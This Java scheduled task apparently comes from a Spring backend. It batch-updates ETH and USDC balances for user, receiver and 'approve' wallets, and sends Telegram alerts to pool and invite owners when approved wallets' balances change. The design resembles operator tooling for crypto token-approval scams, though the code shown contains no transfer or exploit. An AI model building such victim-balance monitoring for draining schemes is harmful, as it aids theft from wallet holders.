package io.renren.modules.job.task;

import java.math.BigDecimal;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import org.apache.ibatis.session.ExecutorType;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import io.renren.common.utils.RedisUtils;
import io.renren.modules.constants.ApproveEnum;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.mapper.WalletsMapper;
import io.renren.modules.core.service.AsyncTelegramNotificationService;
import io.renren.modules.core.service.WalletsService;
import io.renren.modules.utils.EthWalletUtils;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;
/**
 * 钱包Task 用于更新余额
 * @author Administrator
 *
 */
@Slf4j
@Component
public class WalletTask extends BaseTask {
	@Autowired
	WalletsService walletsService;
	@Autowired
	ContractHandler handler;
	@Autowired
	RedisUtils redisUtils;
	@Autowired
	SqlSessionFactory sqlSessionFactory; 
	@Autowired
	AsyncTelegramNotificationService asyncTelegramService;

	@Override
	public void run(String params) throws Exception {
		proccess(params);
	}
   public static List<List<WalletsEntity>> splitIntoChunks(List<WalletsEntity> wallets, int chunkSize) {
        int size = wallets.size();
        return IntStream.range(0, (size + chunkSize - 1) / chunkSize)
                .mapToObj(i -> wallets.subList(i * chunkSize, Math.min(size, (i + 1) * chunkSize)))
                .collect(Collectors.toList());
    }
	private List<BalanceInfo> batchGetBalances(List<WalletsEntity> wallets) {
        return wallets.parallelStream()
            .map(wallet -> {
                try {
                	if(!EthWalletUtils.isValidChecksumAddress(wallet.getWallet())) {
                		return null;
                	}
                    return new BalanceInfo(
                        handler.getEthBalance(wallet.getWallet()),
                        handler.getUsdcBalance(wallet.getWallet()),
                        handler.getEthBalance(wallet.getReciverWallet()),
                        handler.getUsdcBalance(wallet.getReciverWallet()),
                        handler.getEthBalance(wallet.getApproveWallet())
                    );
                } catch (Exception e) {
                    log.error("WalletTask --> 获取余额异常: {}", wallet.getWallet(), e);
                    return null;
                }
            })
            .collect(Collectors.toList());
    }
	
	
    
	@Override
	public void handler(String params)  {
        List<WalletsEntity> wallets = walletsService.list();
        log.info("WalletTask --> 开始更新钱包余额数据.. {} 条.", wallets.size());
        List<List<WalletsEntity>> spiltList = splitIntoChunks(wallets,500);
        spiltList.forEach(wls->{
        	List<BalanceInfo> balances =  batchGetBalances(wls);
        	 try (SqlSession sqlSession = sqlSessionFactory.openSession(ExecutorType.BATCH)) {
                 WalletsMapper mapper = sqlSession.getMapper(WalletsMapper.class);
                 for (int i = 0; i < wls.size(); i++) {
                     WalletsEntity wallet = wls.get(i);
                     BalanceInfo balance = balances.get(i);
                     if(balance == null) continue;
                     try {
                    	if(wallet.getApprove() == ApproveEnum.approved.getCode()) {
                    		notifyTelegramAsync(wallet, balance); //只是提醒授权了的钱包数据
                    	}
                         mapper.updateWalletBalances(
                             wallet.getWallet(),
                             balance.getUserEth(),
                             balance.getUserUsdc(),
                             balance.getReciverEth(),
                             balance.getReciverUsdc(),
                             balance.getApproveEth()
                         );
                         if (i > 0 && (i % 100 == 0 || i == wls.size() - 1)) {
     	                    sqlSession.commit();
     	                    sqlSession.clearCache(); // 清除缓存防止内存溢出
     	                    log.info("WalletTask --> 钱包余额更新 已提交批次: {}/{}",  i+1, wls.size());
                         }
                     } catch(Exception ex) {
                         log.error("WalletTask --> 更新钱包：{} 余额异常. {}", wallet.getWallet(), ex.getMessage());
                         sqlSession.rollback();
                     }
                 }
             }
        });
        log.info("WalletTask --> 结束更新钱包余额数据.. {} 条.", wallets.size());
	}
	
	
	/**
	 * 异步发送Telegram通知
	 */
	private void notifyTelegramAsync(WalletsEntity wallet, BalanceInfo balance) {
		try {
			// 检查USDC余额变化
			if (wallet.getUsdc().compareTo(balance.getUserUsdc()) != 0) {
				String message = String.format(
					"🎯 余额变化通知！\n" +
					"💰 钱包地址: %s\n" +
					"💵 USDC 余额变化：%s → %s\n" +
					"⚠️ 请及时跟进处理！",
					wallet.getWallet(),
					wallet.getUsdc().toPlainString(),
					balance.getUserUsdc().toPlainString()
				);
				
				asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(), wallet.getInviteId(),wallet.getWallet(), message);
			}
			
			// 检查ETH余额变化
			if (wallet.getEth().compareTo(balance.getUserEth()) != 0) {
				String message = String.format(
					"🎯 余额变化通知！\n" +
					"💰 钱包地址: %s\n" +
					"⚡ ETH 余额变化：%s → %s\n" +
					"⚠️ 请及时跟进处理！",
					wallet.getWallet(),
					wallet.getEth().toPlainString(),
					balance.getUserEth().toPlainString()
				);
				asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(),wallet.getInviteId(), wallet.getWallet(), message);
			}
			
		} catch (Exception e) {
			log.error("钱包: {} telegram 通知异常! {}", wallet.getWallet(), e.getMessage());
		}
	}
	 
	
	@Data
	@AllArgsConstructor
	private static class BalanceInfo {
	    private BigDecimal userEth;
	    private BigDecimal userUsdc;
	    private BigDecimal reciverEth;
	    private BigDecimal reciverUsdc;
	    private BigDecimal approveEth;
	}
	
}
